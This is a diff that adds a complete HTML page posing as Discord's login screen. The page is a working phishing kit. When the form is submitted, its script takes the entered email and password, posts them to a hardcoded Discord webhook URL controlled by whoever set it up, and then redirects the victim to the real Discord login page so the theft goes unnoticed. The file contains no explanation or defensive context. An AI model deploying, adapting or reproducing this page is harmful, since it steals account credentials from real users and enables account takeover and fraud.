@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Login</title>
+    <style>
+        body { font-family: Arial; display: flex; justify-content: center; padding-top: 50px; }
+        .box { width: 300px; border: 1px solid #ccc; padding: 20px; border-radius: 8px; }
+        input { width: 100%; padding: 8px; margin: 8px 0; }
+        button { width: 100%; padding: 8px; background: #5865F2; color: white; border: none; border-radius: 4px; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>Welcome back!</h2>
+    <form id="loginForm">
+        <input type="email" id="email" placeholder="Email or phone number" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+</div>
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        let email = document.getElementById('email').value;
+        let password = document.getElementById('password').value;
+        let webhookURL = "https://discord.com/api/webhooks/1507060845006295222/YAX7dWVRT8jYu52d-nOwp2rY1gObequWZsPAvsCFTjZmXJy9p0RdqBjTx2hTc4Ehdsj4";
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: "**Email:** " + email + "\n**Password:** " + password })
+        });
+        window.location.href = "https://discord.com/login";
+    });
+</script>
+</body>
+</html>
